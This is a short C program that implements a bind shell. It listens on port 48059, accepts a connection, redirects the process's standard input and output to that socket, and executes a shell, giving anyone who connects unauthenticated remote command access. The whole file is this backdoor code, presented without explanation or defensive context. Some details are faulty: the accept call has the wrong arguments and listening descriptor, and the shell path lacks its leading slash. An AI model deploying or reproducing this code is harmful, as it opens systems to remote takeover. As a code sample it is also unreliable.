#include<sys/socket.h>
#include<netinet/in.h>

int main(){
	char * shell[2]; //prep for execve call
	int server,client; //file desciber
	struct sockaddr_in serv_addr; //struct to hold ip/port
	server = socket (2,1,0); //build local ip sock
	serv_addr.sin_addr.s_addr = 0; //set sock local
	serv_addr.sin_port=0xBBBB;//port sock, 48059
	serv_addr.sin_family=2;//set native protocol
	bind(server,(struct sockaddr *)&serv_addr,0x10);
	listen(server,0);
	client = accept(0,0); //return client handle
	
	dup2(client,0);
	dup2(client,1);
	dup2(client,2);
	shell[0]="bin/sh";
	shell[1]=0;
	execve(shell[0],shell,0);
	
}
